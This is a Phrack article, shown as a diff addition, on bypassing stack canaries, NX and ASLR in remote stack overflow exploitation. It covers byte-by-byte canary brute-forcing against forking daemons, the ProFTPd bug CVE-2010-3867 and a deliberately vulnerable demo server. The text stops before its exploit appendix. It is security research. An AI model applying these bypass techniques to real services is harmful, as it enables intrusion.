@@ -1,0 +1,1877 @@
+                             ==Phrack Inc.==
+
+		Volume 0x0e, Issue 0x43, Phile #0x0d of 0x10
+
+|=-----------------------------------------------------------------------=|
+|=------=[ Scraps of notes on remote stack overflow exploitation ]=------=|
+|=-----------------------------------------------------------------------=|
+|=-------------=[ Adam 'pi3' Zabrocki - pi3 (at) itsec pl ]=-------------=|
+|=-----------------------------------------------------------------------=|
+
+
+---[ Contents
+
+1 - Introduction
+2 - Anti Exploitation Techniques
+3 - The stack cookies problem 
+  3.1 - A story of cookie protection
+  3.2 - The canary security
+  3.3 - Exploiting canaries remotely
+4 - A few words about the other protections
+5 - Hacking the PoC
+6 - Conclusion
+7 - References
+8 - Appendix - PoC 
+  8.1 - The server (s.c)
+  8.2 - The exploit (moj.c)
+
+
+---[ 1. Introduction
+
+    Before the main topic of this article starts I would like to say, this 
+paper describes a few little techniques based on small observations related
+to the POSIX standard. This observation open a small door for us to use a 
+mix of well known exploitation techniques for bypassing modern security 
+mechanisms / systems.
+
+    Nowadays, finding a stack overflow error does not imply a successful
+attack on the system. Bah! Nowadays, it is much harder, nearly impossible
+to do a remote attack. This is because of the new security patches which
+strongly increase the difficulty of exploiting bugs. We have a really
+impressive number of different kind of patches that protect against attacks
+in different layers and use different ideas. Let's look at the most popular
+and typically used ones in modern *NIX systems.
+
+
+--[ 2. Anti Exploitation Techniques
+
+
+*) AAAS (ASCII Armored Address Space)
+
+AAAS is a very interesting idea. The idea is to load libraries (and more 
+generally any ET_DYN object) in the 16 first megabytes of the address 
+space. As a result, all code and data of these shared libraries are located
+at addresses beginning with a NULL byte. It naturally breaks the 
+exploitation of the particular set of overflow bugs in which an improper 
+use of the NULL byte character leads to the corruption (for example 
+strcpy() functions and similar situations). Such a protection is 
+intrinsically not effective against situations where the NULL byte is not 
+an issue or when the return address used by the attacker does not contain a
+NULL byte (like the PLT on Linux/*BSD x86 systems). Such a protection is 
+used on Fedora distributions.
+
+*) ESP (Executable Space Protection)   
+
+The idea of this protection mechanism is very old and simple. 
+Traditionally, overflows are exploited using shellcodes which means the 
+execution of user supplied 'code' in a 'data' area. Such an unusual 
+situation is easily mitigated by preventing data sections (stack, heap, 
+.data, etc.) and more generally (if possible) all writable process memory 
+from executing. This cannot however prevent the attacker from calling 
+already loaded code such as libraries or program functions. This led to the
+classical return-into-libc family of attacks. Nowadays all PAE or 64 bits 
+x86 linux kernel are supporting this by default.
+
+*) ASLR (Address Space Layout Randomization)
+
+The idea of ASLR is to randomize the loading address of several memory 
+areas such as the program's stack and heap, or its libraries. As a result 
+even if the attacker overwrites the metadata and is able to change the 
+program flow, he doesn't know where the next instructions (shellcode, 
+library functions) are. The idea is simple and effective. ASLR is enabled 
+by default on linux kernel since linux 2.6.12.
+
+*) Stack canaries (canaries of the death)
+
+This is a compiler mechanism, in contrast to previously kernel-based 
+described techniques. When a function is called, the code inserted by the 
+compiler in its prologue stores a special value (the so-called cookie) on 
+the stack before the metadata. This value is a kind of defender of 
+sensitive data. During the epilogue the stack value is compared with the 
+original one and if they are not the same then a memory corruption must 
+have occurred. The program is then killed and this situation is reported in
+the system logs. Details about technical implementation and little arm race
+between protection and bypassing protection in this area will be explained 
+further.
+
+
+--[ 3. The stack cookies problem 
+
+--[ 3.1. A story of cookie protection
+
+There were / are many of its implementations. Some of them are better while 
+others are worse. Definitely the best implementation is SSP (Stack Smashing
+Protector), also known as ProPolice which is our topic and has been 
+included in gcc since version 4.x.
+
+How do those canaries work? At the time of creating the stack frame, the
+so-called canary is added. This is a random number. When a hacker triggers
+a stack overflow bug, before overwriting the metadata stored on the stack 
+he has to overwrite the canary. When the epilogue is called (which removes 
+the stack frame) the original canary value (stored in the TLS, referred by 
+the gs segment selector on x86) is compared to the value on the stack. If 
+these values are different SSP writes a message about the attack in the 
+system logs and terminate the program. 
+
+When a program is compiled with SSP, the stack is setup in this way:
+
+
+            |             ...             |
+            -------------------------------
+            | N - Argument for function   |
+            -------------------------------
+            | N-1 - Argument for function |
+            -------------------------------
+            |             ...             |
+            -------------------------------
+            | 2 - Argument for function   |
+            -------------------------------
+            | 1 - Argument for function   |
+            -------------------------------
+            |        Return Address       |
+            -------------------------------
+            |         Frame Pointer       |
+            -------------------------------
+            |             xxx             |
+            -------------------------------
+            |           Canary            |
+            -------------------------------
+            |       Local Variables       |
+            -------------------------------
+            |             ...             |
+ 
+
+What is an 'xxx' value? So... It is very common that gcc adds some padding 
+on the stack. In compilers of the 3.3.x and 3.4.x versions it is usually 
+20 bytes. It prevents exploiting off-by-one bugs. This article is not about
+this solution either, but we should be aware of that.
+
+The reordering issue
+--------------------
+
+Bulba and Kil3r published a technique in their phrack article [1] on how to
+bypass this security protection, if the local variables are in this kind of 
+configuration:
+
+---------------------------------------------------------------------------
+                    int func(char *arg) {
+
+                       char *ptr;
+                       char buf[MAX];
+
+                       ...
+
+                       memcpy(buf,arg,strlen(arg));
+
+                       ...
+
+                       strcpy(ptr,arg);
+
+                       ...
+
+                    }
+---------------------------------------------------------------------------
+
+In this situation we don't need to overwrite the canary value. We can 
+simply overwrite the ptr pointer with the return address. Since it's used 
+as the destination pointer of a memory copy then we can set what we want 
+and where we want (which includes the return address) without touching the 
+canary:
+
+
+                |             ...             |
+                -------------------------------
+                | arg - Argument for function |
+                -------------------------------
+          ----> |        Return Address       |
+          |     -------------------------------
+          |     |         Frame Pointer       |
+          |     -------------------------------
+          |     |             xxx             |
+          |     -------------------------------
+          |     |           Canary            |
+          |     -------------------------------
+          ----  |           char *ptr         |
+                -------------------------------
+                |        char buf[MAX-1]      |
+                -------------------------------
+                |        char buf[MAX-2]      |
+                -------------------------------
+                |             ...             |
+                -------------------------------
+                |          char buf[0]        |
+                -------------------------------
+                |             ...             |
+
+
+In this kind of situation, if an attacker can directly (or not) modify a 
+pointer, the canaries of the death may fail!
+
+In fact SSP is much more complicated and advanced than other 
+implementations of the canaries of the death (e.g. StackGuard). Indeed SSP 
+also uses some heuristic to order the local variables on the stack. 
+
+For example, imagine the following function:
+
+---------------------------------------------------------------------------
+            int func(char *arg1, char *arg2) {
+
+               int a;
+               int *b;
+               char c[10];
+               char d[3];
+
+               memcpy(c,arg1,strlen(arg1));
+               *b = 5;
+               memcpy(d,arg2,strlen(arg2));
+               return *b;
+            }
+---------------------------------------------------------------------------
+
+In theory the stack should more or less look like that:
+
+               (d[..]) (c[..]) (*b) (a) (...) (FP) (IP)
+
+But SSP changes the order of the local variables and the stack will instead
+look like this:
+
+               (*b) (a) (d[..]) (c[..]) (...) (FP) (IP)
+
+Of course SSP always adds the canary. Now the stack looks really bad from 
+the attacker's point of view:
+
+
+                |             ...             |
+                -------------------------------
+                |arg1 - Argument for function |
+                -------------------------------
+                |arg2 - Argument for function |
+                -------------------------------
+                |        Return Address       |
+                -------------------------------
+                |         Frame Pointer       |
+                -------------------------------
+                |             xxx             |
+                -------------------------------
+                |           Canary            |
+                -------------------------------
+                |           char c[..]        |
+                -------------------------------
+                |           char d[..]        |
+                -------------------------------
+                |            int a            |
+                -------------------------------
+                |            int *b           |
+                -------------------------------
+                |         Copy of arg1        |
+                -------------------------------
+                |         Copy of arg2        |
+                -------------------------------
+                |             ...             |
+
+
+SSP always tries to put all buffers close to the canary, while pointers as 
+far from the buffers as it can. The arguments of the function are also 
+copied in a special place on the stack so that the original arguments are 
+never used.
+
+With such a reordering the chances to overwrite some pointers to modify 
+the control flow seem low. It looks like an attacker doesn't have any other
+option than a mere bruteforce to exploit stack overflow bugs, does he? :)
+
+The limitations of SSP
+----------------------
+
+Even SSP is not perfect. There are some 'special' cases when SSP can't 
+create a 'safe frame'. Here are some of the known situations:
+
+*) SSP does NOT protect each buffer separately. When data on the stack is 
+   reordered in a safe way we can still overwrite the buffer by another 
+   buffer. If there are many buffers, all of them will be put close to each
+   other. We can imagine the situation when a buffer, which is before 
+   another buffer, can overwrite it. If there are data used by the 
+   application for the control flow in the overflown buffer, then a door is
+   open and depending on the program it may be possible to exploit this 
+   control.
+
+*) If we have structures or classes, SSP will NOT reorder the arguments
+   inside of this data area.
+
+*) If the function accepts a variable number of arguments (such as 
+   *printf()) then SSP will not know how many arguments to expect. In this 
+   situation the compiler will not be able to copy the arguments in a safe
+   location.
+
+*) If the program uses the alloc() function or extends the standard C 
+   language on how to create a dynamic array (e.g. char tab[size+5]) SSP 
+   will place all this data on top of the frame. People interested in
+   dynamic arrays should read andrewg's phrack paper on the subject [13].
+
+*) In most cases, when the application "plays" with virtual functions 
+   in C++, it is hard to create a 'secure frame' - for detailed
+   information please read reference [2].
+
+**) Some distributions (like Ubuntu 10.04) have a canary which is masked by
+    value 0x00FFFFFF. The NULL byte will be always there.
+
+**) StackGuard v2.0.1 always uses the static canary 0x000AFF0D. These bytes
+    weren't chosen randomly. The 0x00 byte is for stopping the copy of 
+    strings arguments. The 0x0A byte is the 'new line' and it can stop 
+    reading bytes by function like *gets(). The byte 0xFF and 0x0D ('\r') 
+    can sometimes stop copying process too. If you check the value of 
+    terminator canary generated by SSP on non system-V you will discover it
+    is almost the same. StackGuard add also the byte '\r' (0x0D) which SSP 
+    doesn't.
+
+---[ 3.2 - The canary security
+
+Beginning from the gcc version 4.1 stage2 [6], [7] the Stack Smashing
+Protector is included by default. Gcc developers reimplemented IBM Pro 
+Police Stack Detector. Let's look at its implementation under the loupe. 
+We need to determine:
+
+    *) If the canary is really random
+    *) If the address of the canary can be leaked
+
+The runtime protection
+-----------------------
+
+If we look inside a protected function we can find the following code 
+added by SSP to the epilogue:
+
+---------------------------------------------------------------------------
+0x0804841c <main+40>:   mov    -0x8(%ebp),%edx
+0x0804841f <main+43>:   xor    %gs:0x14,%edx
+0x08048426 <main+50>:   je     0x804842d <main+57>
+0x08048428 <main+52>:   call   0x8048330 <__stack_chk_fail@plt>
+---------------------------------------------------------------------------
+
+This code retrieves the local canary value from the stack and compares it
+with the original one stored in the TLS. If the values are not the same, 
+the function __stack_chk_fail() takes control. 
+
+The implementation of this function can be found in GNU C Library code in 
+file "debug/stack_chk_fail.c"
+
+---------------------------------------------------------------------------
+	#include <stdio.h>
+	#include <stdlib.h>
+	 
+	extern char **__libc_argv attribute_hidden;
+	 
+	void
+	__attribute__ ((noreturn))
+	__stack_chk_fail (void)
+	{
+	  __fortify_fail ("stack smashing detected");
+	}
+---------------------------------------------------------------------------
+
+What is important is that this function has the attribute "noreturn". That 
+means (obviously) that it never returns. Let's look deeper and see how. The
+definition of the function __fortify_fail() can be found it in file 
+"debug/fortify_fail.c"
+
+---------------------------------------------------------------------------
+	#include <stdio.h>
+	#include <stdlib.h>
+	 
+	extern char **__libc_argv attribute_hidden;
+	 
+	void
+	__attribute__ ((noreturn))
+	__fortify_fail (msg)
+	     const char *msg;
+	{
+	  /* The loop is added only to keep gcc happy.  */
+	  while (1)
+	    __libc_message (2, "*** %s ***: %s terminated\n",
+	                    msg, __libc_argv[0] ?: "<unknown>");
+	}
+	libc_hidden_def (__fortify_fail)
+---------------------------------------------------------------------------
+
+So __fortify_fail() is a wrapper around the function __libc_message() 
+which in turn calls abort(). There is indeed no way to avoid it.
+
+The initialisation
+-------------------
+
+Let's have a look at the code of the Run-Time Dynamic Linker in 
+"etc/rtld.c". The canary initialisation is performed by the function 
+security_init() which is called when the RTLD is loaded (the TLS was init
+by the init_tls() function before):
+
+---------------------------------------------------------------------------
+	static void
+	security_init (void)
+	{
+	  /* Set up the stack checker's canary.  */
+	  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard ();
+	#ifdef THREAD_SET_STACK_GUARD
+	  THREAD_SET_STACK_GUARD (stack_chk_guard);
+	#else
+	  __stack_chk_guard = stack_chk_guard;
+	#endif
+	 
+        [...] // pointer guard stuff
+	}
+---------------------------------------------------------------------------
+
+The canary value is created by the function _dl_setup_stack_chk_guard(). In
+original implementation published by IBM it was the function __guard_setup.
+
+Depending on the operating system, the function _dl_setup_stack_chk_guard()
+is either defined in file "sysdeps/unix/sysv/linux/dl-osinfo.h" or in file 
+"sysdeps/generic/dl-osinfo.h"
+
+If we go to the UNIX System V definition of the function we will find:
+
+---------------------------------------------------------------------------
+	static inline uintptr_t __attribute__ ((always_inline))
+	_dl_setup_stack_chk_guard (void)
+	{
+	  uintptr_t ret;
+	#ifdef ENABLE_STACKGUARD_RANDOMIZE
+	  int fd = __open ("/dev/urandom", O_RDONLY);
+	  if (fd >= 0)
+	    {
+	      ssize_t reslen = __read (fd, &ret, sizeof (ret));
+	      __close (fd);
+	      if (reslen == (ssize_t) sizeof (ret))
+	        return ret;
+	    }
+	#endif
+	  ret = 0;
+	  unsigned char *p = (unsigned char *) &ret;
+	  p[sizeof (ret) - 1] = 255;
+	  p[sizeof (ret) - 2] = '\n';
+	  return ret;
+	}
+---------------------------------------------------------------------------
+
+If the macro ENABLE_STACKGUARD_RANDOMIZE is enabled, the function open the 
+device "/dev/urandom", read sizeof(uintptr_t) bytes and return them. 
+Otherwise of if this operation is not successful, a terminator canary is
+generated. First it put the value 0x00 in the variable ret. Next it changes
+two bytes to the value 0xFF and 0xa. Finally the terminator canary will 
+always be 0x00000aff.
+
+Now if we go to the definition of function _dl_setup_stack_chk_guard()
+for other operating systems we see:
+
+---------------------------------------------------------------------------
+	#include <stdint.h>
+	 
+	static inline uintptr_t __attribute__ ((always_inline))
+	_dl_setup_stack_chk_guard (void)
+	{
+	  uintptr_t ret = 0;
+	  unsigned char *p = (unsigned char *) &ret;
+	  p[sizeof (ret) - 1] = 255;
+	  p[sizeof (ret) - 2] = '\n';
+	  p[0] = 0;
+	  return ret;
+	}
+---------------------------------------------------------------------------
+
+So this function always generates a terminator canary value.
+
+Conclusion
+----------
+
+Either the canary is fully random and unpredictable (assuming /dev/urandom
+is safe which is a fair assumption) or it's constant and weak (weaker than
+stackguard) but nontheless troublesome in some kind of situations.
+
+The storage of its value is dependant on the TLS which itself is not at 
+fixed location (and the virtual address is never leaked in the code thanks
+to the segment selector trick) which means that it could hardly be leaked.
+
+
+---[ 3.3 - Exploiting canaries remotely
+
+Usually networks daemons create a new thread by calling clone() or a new 
+process by calling fork() to support a new connection. In the case of 
+fork() and depending on the daemon, the child process may or may not call 
+execve() which means that it will be in one the two situations:
+
+
+1. without execve()
+
+                                [mother]
+                      --------> accept()
+                      |            |
+                      |            | <- new connection
+                      |            |
+                      |          fork()
+                      |          |    |
+                      |   mother |    | child
+                      -----------|    |
+                                      |
+                                    read()
+                                      |
+                                     ...
+                                     ...
+
+2. with execve()
+                                [mother]
+                      --------> accept()
+                      |            |
+                      |            | <- new connection
+                      |            |
+                      |          fork()
+                      |          |    |
+                      |   mother |    | child
+                      -----------|    |
+                                      |
+                                   execve()
+                                      |
+                                      |
+                                    read()
+                                      |
+                                     ...
+                                     ...
+
+Note 1: OpenSSH is a good example of the second example.
+Note 2: Of course there is also the possibility that the server is using
+select() instead of accept(). In such case, there is of course no fork().
+
+As stated by the man page:
+
+*) the fork() system call creates a duplicate of the calling process which 
+means that father and child share a same canary as this is a 
+per-process-canary and not a per-function-canary mechanism. This is an 
+interesting property as if for each attempt we were able to guess a little 
+of the canary then with a finite number of guesses we would be successful.
+
+*) when execve() is called "text, data, bss, and stack of the calling 
+process are overwritten by that of the program loaded." This implies that 
+the canary is different for each child. As a result, being able to guess a 
+little of the child canary is most likely useless as this will result in a 
+crash and any result wouldn't be applicable to the next child.
+
+Considering 32-bits architecture, the number of possible canaries is up to 
+2^32 (2^24 on Ubuntu) which is around 4 billions (respectively 16 millions)
+which is impossible to test remotely while feasible locally in a few hours. 
+
+What should one do? Ben Hawkes [9] suggested an interesting method: brute 
+forcing with a byte-by-byte technique which is much more effective. When 
+can we use it? As we have mentioned, the canary does not change while 
+fork()'ing whereas with execve() it does. As a result guessing one byte 
+after an other requires that the fork() is not followed by an execve() 
+call.
+
+Here is the stack of the vulnerable function:
+
+| ..P.. | ..P.. | ..P.. | ..P.. | ..C.. | ..C.. | ..C.. | ..C.. |
+
+P - 1 byte of buffer
+C - 1 byte of canary
+
+First, we overwrite the first byte of canary and we check when the program 
+ends with an error and when does not. It could be done in several ways. 
+Hawkes proposed to estimate the program's answer time: whenever it misses 
+the canary's byte, the program ends immediately. When the canary's byte 
+matches, the program will still run, so its ending time is much longer than
+in the first case. We do not necessarily have to use that technique. It 
+often happens that after calling the function, the server (daemon) sends us
+back some responses as the result of an operation. All we need to do is to 
+check whether an expected data is received by the socket. If it is the 
+expected one, it means we've got the correct canary's byte and we can move 
+to the next one.
+
+Because 1 byte can have 256 different values at most, it becomes a relative
+calculus. Knowing the first byte's value, we have to guess 256 different 
+possibilities for the following bytes which means that the whole cookie 
+could be guessed in 4*256 = 1024 combinations which is reasonable.
+
+Here is the drawing of the four steps (each being a particular byte guess):
+
+First byte:
+| ..P.. | ..P.. | ..P.. | ..P.. | ..X.. | ..C.. | ..C.. | ..C.. |
+
+Second byte:
+| ..P.. | ..P.. | ..P.. | ..P.. | ..X.. | ..Y.. | ..C.. | ..C.. |
+
+Third byte:
+| ..P.. | ..P.. | ..P.. | ..P.. | ..X.. | ..Y.. | ..Z.. | ..C.. |
+
+Fourth byte:
+| ..P.. | ..P.. | ..P.. | ..P.. | ..X.. | ..Y.. | ..Z.. | ..A.. |
+
+
+When the attack is finished, we know that the canary's value is XYZA. With 
+this knowledge we are then able to continue the attack of the application. 
+Overwriting data, we put the canary's value in the canary's location. Since
+the canary is overwritten by its original value, the memory corruption is
+not detected.
+
+The easiest and simplest way to find the canary's location is nothing else 
+than testing. If we know that we can overwrite a 100 bytes buffer, we 
+actually send a fake packet with 101 bytes length and we check the answer 
+in the same way as we did while discussing theory of breaking the canary's
+value. If the program does NOT crash, it means that we have overwritten 
+something else than the canary with high probability (we could also have 
+overwritten the first byte of the canary with the correct value). 
+Continuing to increase the amount of overwritten bytes, the program will 
+finally stop running so we will know where the canary's value begins.
+
+Mitigation
+----------
+
+When will this technique not work? Every time we can't fully control the 
+overwritten bytes. For example you may not be able to control the last 
+character of your buffer or you may be have to deal with filtering (if NULL
+bytes are prohibited then it's over).
+
+A good example of such a situation is the latest pre-auth ProFTPd bug 
+(CVE-2010-3867) discovered by TJ Saunders. The bug lies in the parsing of 
+TELNET_IAC chars because of miscalculated end of reading loop. Let's look 
+at this bug closer.
+
+The problem lies in the function pr_netio_telnet_gets() from the file 
+"src/netio.c":
+
+---------------------------------------------------------------------------
+	char *pr_netio_telnet_gets(char *buf, size_t buflen,
+	    pr_netio_stream_t *in_nstrm, pr_netio_stream_t *out_nstrm) {
+	  char *bp = buf;
+
+	...
+
+  [L1]  while (buflen) {
+
+  ...
+
+	      toread = pr_netio_read(in_nstrm, pbuf->buf,
+	      (buflen < pbuf->buflen ?  buflen : pbuf->buflen), 1);
+  ...
+
+  [L2]    while (buflen && toread > 0 && *pbuf->current != '\n' 
+          && toread--) {
+  ...
+	          if (handle_iac == TRUE) {
+	            switch (telnet_mode) {
+	              case TELNET_IAC:
+            	    switch (cp) {
+
+  ...
+  ...
+
+            	      default:
+
+  ...
+
+                    	*bp++ = TELNET_IAC;
+  [L3]                  buflen--;
+
+            	        telnet_mode = 0;
+            	        break;
+                	}
+  ...
+	            }
+	          }
+          
+              *bp++ = cp;
+  [L4]        buflen--;
+	        }
+  ...
+  ...
+	        *bp = '\0';
+	        return buf;
+        }
+    }
+---------------------------------------------------------------------------
+
+The loop [L2] reads and parses the bytes. Each time it decrements buflen 
+[L4]. A problem exists when TELNET_IAC character comes (0xFF). When this 
+character occurs in the parsing buflen is decremented [L3]. As a result in 
+this situation, buflen is decremented by 2 which is perfect to bypass an 
+inappropriate check in [L1]. Indeed, when buflen == 1 if the parsed 
+character is TELNET_IAC then buflen = 1 - 2 = -1. As a result, the 
+"while (buflen && " condition of [L1] holds and the copy continues (until 
+an '\n' is found).
+
+The function pr_netio_telnet_gets() is called by function pr_cmd_read() 
+from file "src/main.c":
+
+---------------------------------------------------------------------------
+	int pr_cmd_read(cmd_rec **res) {
+	  static long cmd_bufsz = -1;
+	  char buf[PR_DEFAULT_CMD_BUFSZ+1] = {'\0'};
+
+	...
+
+	  while (TRUE) {
+
+	...
+
+	    if (pr_netio_telnet_gets(buf, sizeof(buf)-1, session.c->instrm,
+	        session.c->outstrm) == NULL) {
+
+	...
+
+	  }
+
+	...
+	...
+
+	  return 0;
+	}
+---------------------------------------------------------------------------
+
+In this case the argument for the vulnerable function is a local buffer on 
+the stack. So this is a classical stack buffer overflow bug. In theory all 
+conditions are met to bypass pro-police canary using the byte-by-byte 
+technique. But if we look closer to the vulnerable function we see this 
+code:
+
+	  *bp = '\0';
+
+... which break the idea of using a byte-by-byte attack. Why? Because we 
+can never control the last overflowed byte which is always 0x00, only the 
+penultimate.
+
+Additionally, the 'byte-by-byte' method requires that all children have a 
+same canary. This is not possible if the children are calling execve() as 
+explained earlier. In such a situation, a bruteforce attack is quite 
+unlikely to succeed. Of course we could try to guess 3 bytes each time if 
+we had a lot of time... but it would means a one shot attack afterward 
+since multiplying the complexity of both attempts would require too much 
+time.
+
+Finally, grsecurity provides an interesting security feature to prevent 
+this kind of exploitation. Considering the fact that the bruteforce will 
+necessarily result in the crash of children, then a child dying with SIGILL
+(such as if PaX killed it for example) is highly suspicious. As a result, 
+while in do_coredump() the kernel set a flag in the parent process using 
+the gr_handle_brute_attach() function. The next forking attempt of the 
+parent will then be delayed. Indeed in do_fork() the task is set in the 
+TASK_UNINTERRUPTIBLE state and put to sleep for (at least) 30s.
+
+---------------------------------------------------------------------------
++void gr_handle_brute_attach(struct task_struct *p)
++{
++#ifdef CONFIG_GRKERNSEC_BRUTE
++	read_lock(&tasklist_lock);
++	read_lock(&grsec_exec_file_lock);
++	if (p->p_pptr && p->p_pptr->exec_file == p->exec_file)
++		p->p_pptr->brute = 1;
++	read_unlock(&grsec_exec_file_lock);
++	read_unlock(&tasklist_lock);
++#endif
++	return;
++}
++
++void gr_handle_brute_check(void)
++{
++#ifdef CONFIG_GRKERNSEC_BRUTE
++	if (current->brute) {
++		set_current_state(TASK_UNINTERRUPTIBLE);
++		schedule_timeout(30 * HZ);
++	}	
++#endif
++	return;
++}
+---------------------------------------------------------------------------
+
+While this mechanism has its limit (SIGILL is the only signal to trigger 
+the delay), it proves itself effective to slow down an attacker.
+
+
+--[ 4 - A few words about the other protections
+
+When the daemon is forking without calling execve() we can bypass SSP 
+because we can discover the "random" value of the canary, but we still have
+to deal with non-exec memory and ASLR. 
+
+Executable Space Protection
+---------------------------
+
+The 10th of August 1997 Solar Designer's post in bugtraq mailing list 
+introduced the ret-into-libc attack which allows to bypass non-exec memory 
+restriction [11]. The technique was later enhanced by nergal in his phrack 
+paper [10] in which he introduced many new and now well known concepts 
+still in use nowadays such as:
+
+    *) Chaining. The consecutive call of several functions. [10] describes
+       the necessary stack layout to perform such a thing on x86. The 
+       concept was later extended to other architectures and "gadgets" 
+       (ROP) were introduced. 
+
+    *) The use of mprotect() which was introduced as a counter measure 
+       against PaX and still effective on some systems (though not on PaX 
+       itself).
+
+    *) dl-resolve() which allows to call functions of the shared library 
+       even when they don't have an entry in the PLT.
+
+Ok - so we know the technique that we should use to bypass non-executable 
+memory but we still have a few problems. We don't know the address of the 
+function that should be called (typically a system()-like) and the address 
+of the argument(s) for this function. 
+
+At that point as an attacker you may have three solutions:
+
+    *) You can try to bruteforce. Obviously and as stated many times, you 
+       should only bruteforce the strict necessary which is usually an 
+       offset from which you can deduce the missing addresses. Interesting 
+       information though a bit outdated on how you could perform this are 
+       given in [12].
+
+    *) You find some way to perform an info leak. Depending on the 
+       situation this can be tricky (though not always) especially on 
+       modern systems where daemons are often compiled as PIE binaries. For
+       example on recent Ubuntu, by default most daemons are PIE binaries. 
+       As a result, it's no more possible to use fixed address in the 
+       code/data segment of the program.
+
+    *) You can exploit the memory layout to find some clever way to reduce 
+       the amount of parameters to guess. Depending on the context, a deep 
+       study of the program may be necessary.
+
+The important thing to remember is that there is no generic technique, a 
+clever bug exploitation is highly dependant of the context induced by the
+program itself. This is especially true with modern memory protections.
+
+ASLR: Taking advantage of fork()
+--------------------------------
+
+As explained earlier the address space of the child process is a copy of 
+its parent. However this is no longer the case if the child performs an 
+execve() as the process is then completely reloaded and the address space
+is then totally unpredictable because of the ASLR.
+
+From a mathematical point of view, guessing an address is a: 
+    - sampling without replacement (in fork() only situations)
+    - sampling with replacement (in fork() followed by execve() situation)
+
+In the case of PIE network daemons, you have at least two distincts sources
+of entropy:
+
+    *) the cookie: 24 bits or 32 bits on 32 bit OS
+    *) the ASLR: 16 bits for mmap() randomization with PaX (in PAGEEXEC 
+       case) on 32 bit OS
+
+(Last claim is proved by the following patch extract)
+
+---------------------------------------------------------------------------
++#ifdef CONFIG_PAX_ASLR
++	if (current->mm->pax_flags & MF_PAX_RANDMMAP) {
++		current->mm->delta_mmap = (pax_get_random_long() 
+                & ((1UL << PAX_DELTA_MMAP_LEN)-1)) << PAGE_SHIFT;
++		current->mm->delta_stack = (pax_get_random_long() 
+                & ((1UL << PAX_DELTA_STACK_LEN)-1)) << PAGE_SHIFT;
++	}
++#endif
+
++#define PAX_DELTA_MMAP_LEN	(current->mm->pax_flags 
+                                & MF_PAX_SEGMEXEC ? 15 : 16)
++#define PAX_DELTA_STACK_LEN	(current->mm->pax_flags 
+                                & MF_PAX_SEGMEXEC ? 15 : 16)
+---------------------------------------------------------------------------
+
+Note: ET_DYN object randomization is performed using the delta_mmap offset.
+We will see in chapter 5 that we need to guess this parameter.
+
+Now the main idea is that without execve() the expected number of trials to
+perform the attack is the sum of the number of attempts required to guess 
+the canary and the memory layout. With execve() it's their product. 
+
+Example:
+
+    Exploiting the proftpd bug on an Ubuntu 10.04 + PaX with: 
+        - no byte-by-byte
+        - no execve()
+        - cookie has a null byte
+        - binary is compiled as PIE
+
+It should require an average of 2^24 + 2^16 attempts (if binary is PIE). 
+From a complexity point of view, we could say that guessing both values is 
+as hard as guessing the cookie.
+
+Note: Last minute update. It seems that proftpd is not compiled as PIE in 
+common distributions/Unix (according to many exploits targets). 
+
+
+---[ 5. Hacking the PoC
+
+As a proof of these scribbles let's study and exploit an example of a 
+vulnerable server (complete code is in appendix). A trivial stack overflow
+was emulated in the following function:
+
+---------------------------------------------------------------------------
+int vuln_func(char *args, int fd, int ile) {
+
+    char buf[100];
+    memset(buf, 0, sizeof buf);
+
+    if ( (strncmp(args,"vuln",4)) == 0) {                     [L1]
+#ifdef __DEBUG
+        stack_dump("BEFORE", buf);                            [L2]
+#endif
+        write(fd,"Vuln running...\nCopying bytes...",32);
+        memcpy(buf,args+5,ile-5);                             [L3]
+#ifdef __DEBUG
+        stack_dump("AFTER", buf);                             [L4]
+#endif
+        write(fd,"\nDONE\nReturn to the main loop\n",30);     [L5]
+        return 1;
+    }
+
+    else if ( (strncmp(args,"quit",4)) == 0) {
+        write(fd,"Exiting...\n",11);
+        return 0;
+    }
+
+    else {
+        write(fd,"help:\n",6);
+        write(fd," [*] vuln <args>\n",17);
+        write(fd," [*] help\n",10);
+        write(fd," [*] quit\n",10);
+        return 1;
+    }
+}
+---------------------------------------------------------------------------
+
+Let's analyze a bit this function:
+
+    *) The bug is triggered when an attacker supplies a "vuln XXXXX" with 
+       a large enough "XXXXX" (> 100 bytes). [L1, L3]
+
+    *) The attacker is fully able to control his payload without 
+       restrictions (no payload filtering, no overflow restriction)  
+
+    *) When the overflow takes place, we possibly overwrite some local 
+       variables which may induce a bug in [L5] and possibly crash the 
+       program.
+
+Note: Because of the fork(), debugging can be tedious. As a result I added
+a function to leak the stack layout in a file both before and after the 
+overflow.
+
+The program was compiled with -fstack-protector-all and -fpie -pie which
+means that we will have to exploit the program with:
+    
+    *) Non exec + full ASLR (code and data segments are also randomized)
+    *) Stack canary
+    *) Ascii armored protection
+
+Depending on the Unix target, some of these protections may or may not be 
+effective. However we will assume that they are all activated.
+
+Taking advantage of fork()
+--------------------------
+
+The first process of the exploitation is obviously to guess the stack 
+cookie. As said earlier, fork() will grant us children with the same 
+address space. As a result we will be able to guess the cookie with the 
+technique described in 3.3 which allows us to arbitrary overwrite anything
+(including of course the saved EIP).
+
+In a second time, we need to find an address in which returning. One of the
+best solution is to return into a function of the .text which would 
+generate some network activity. However the server is a PIE binary thus an 
+ET_DYN ELF object. As a result, the address of this function has to be 
+guessed.
+ 
+Now assuming that we have the original binary (fair assumption), the offset
+of the function is known which means that we only need to bruteforce the 
+load address of the ELF object. Since such an address is aligned on 
+PAGE_SIZE basis, on a 32bits architecture the 12 less significant bits are
+all 0.
+
+For example consider the following code:
+
+    10be:       e8 fc ff ff ff          call   10bf <main+0x2f3>    
+    10c3:       c7 44 24 08 44 00 00    movl   $0x44,0x8(%esp)
+      ^^----------------------- last byte value. not randomised at all
+     ^------------------------- last half value. bottom nibble is not 
+				                randomised
+
+Additionally if Ascii Armour protection is used, the most significant byte
+of the address will be 0x00 (something which does not happen under PaX).
+
+The conclusion is that the amount to bruteforce is so small that it can be
+done in a couple of seconds/minutes through the network.
+
+Studying the stack layout
+--------------------------
+
+Thanks to our debugging function, it's easy to see the stack layout when 
+the crash occurs. Here is the layout on an Ubuntu 10.04 before the 
+overflow:
+
+        bfa38648: 00000000 00000000 00000000 00000000
+        bfa38658: 00000000 00000000 00000000 00000000
+        bfa38668: 00000000 00000000 00000000 00000000
+        bfa38678: 00000000 00000000 00000000 00000000
+        bfa38688: 00000000 00000000 00000000 00000000
+        bfa38698: 00000000 00000000 00000000 00000000
+        bfa386a8: 00000000 8c261700 00000004 005cdff4
+        bfa386b8: bfa387f8 005cbec1 bfa386f4 00000004
+        bfa386c8: 0000005f 00000000 00258be0 00257ff4
+        bfa386d8: 00000000 0000005f 00000003 00000004
+        bfa386e8: 0000029a 00000010 00000000 6e6c7576
+
